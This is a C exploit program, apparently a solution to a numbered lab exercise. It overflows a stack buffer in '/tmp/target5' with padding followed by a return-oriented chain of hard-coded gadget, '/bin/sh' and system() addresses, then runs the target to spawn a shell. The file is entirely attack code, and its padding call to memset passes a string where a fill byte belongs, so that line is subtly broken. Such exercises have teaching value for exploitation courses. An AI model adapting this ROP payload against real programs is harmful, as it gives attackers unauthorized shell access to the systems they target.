#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include "write_xploit.h"

#define TARGET "/tmp/target5"
#define DEFAULT_OUTPUT "/tmp/xploit5_output"
#define NOP "\x90"

int main() {
    char exploit[288];
    memset(exploit, NOP, 264); 

    uint64_t pop_rdi = 0x00000000004b4388;
    uint64_t bin_sh  = 0x00000000004d9000;
    uint64_t system_ptr = 0x00000000004b3f30; 

    memcpy(exploit + 264, &pop_rdi, 8);
    memcpy(exploit + 272, &bin_sh, 8);
    memcpy(exploit + 280, &system_ptr, 8);

    write_xploit(exploit, sizeof(exploit), DEFAULT_OUTPUT);

    char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
    execve(TARGET, args, NULL);
    return 0;
}